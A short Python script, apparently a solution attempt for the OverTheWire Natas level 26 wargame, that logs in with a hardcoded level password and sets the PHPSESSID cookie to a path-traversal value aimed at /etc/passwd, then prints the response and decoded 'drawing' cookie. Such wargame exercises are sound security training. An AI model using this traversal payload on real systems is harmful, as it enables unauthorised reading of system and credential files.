import requests
import re
import urllib

username ='natas26'
password ='oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T'

url = 'http://%s.natas.labs.overthewire.org/' %username
session = requests.Session()

responce = session.get(url,auth=(username,password))
content = responce.text

session.cookies["PHPSESSID"] = "../../../../../etc/passwd"
responce = session.get(url+"?x1=0&y1=0&x2=500&y2=500",auth=(username,password))
content=responce.text
print(content)
print(session.cookies["drawing"])
print(urllib.unquote(session.cookies["drawing"]))

# print("the password for natas26 is = ",re.findall('] (.*)',content)[0])
 